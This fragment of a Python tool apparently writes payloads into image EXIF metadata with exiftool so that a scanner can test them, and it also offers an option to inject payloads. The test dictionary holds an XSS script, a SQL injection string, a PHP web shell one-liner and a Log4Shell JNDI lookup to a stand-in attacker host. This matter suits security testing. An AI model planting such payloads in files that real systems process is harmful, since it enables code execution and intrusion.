        test_payloads = {
            'Comment': '<script>alert("XSS")</script>',
            'Artist': "' OR 1=1 -- -",
            'Copyright': '<?php system($_GET["cmd"]); ?>',
            'GPS Latitude': '37 deg 46\' 26.00"',
            'GPS Longitude': '122 deg 25\' 52.00"',
            'Software': 'SecretApp v1.3.7',
            'Make': 'TestDevice ${jndi:ldap://attacker.com}'
        }
        for field, value in test_payloads.items():
            subprocess.run([
                'exiftool',
                f'-{field}={value}',
                '-overwrite_original',
                str(test_image)
            ], capture_output=True)
        console.print(f"[bold green]Test image created: {test_image}[/bold green]")
        subprocess.run(['exiftool', str(test_image)], check=True)
        sys.exit(0)

    if args.image:
        res = tool.process_image(Path(args.image))
        if res:
            results.append(res)
    elif args.batch:
        results = tool.batch_process(args.batch)
    elif args.payload and args.image:
        tool.inject_payload(Path(args.image), args.payload, args.field)
        res = tool.process_image(Path(args.image))
        if res:
            results.append(res)
    # URL, domain, and wayback scanning can be implemented later

    if results:
        if args.report:
            tool.generate_report(results)
        if args.dashboard:
            start_dashboard(results)
    else:
        console.print("[bold red]No results to display.[/bold red]")

if __name__ == "__main__":
    main()
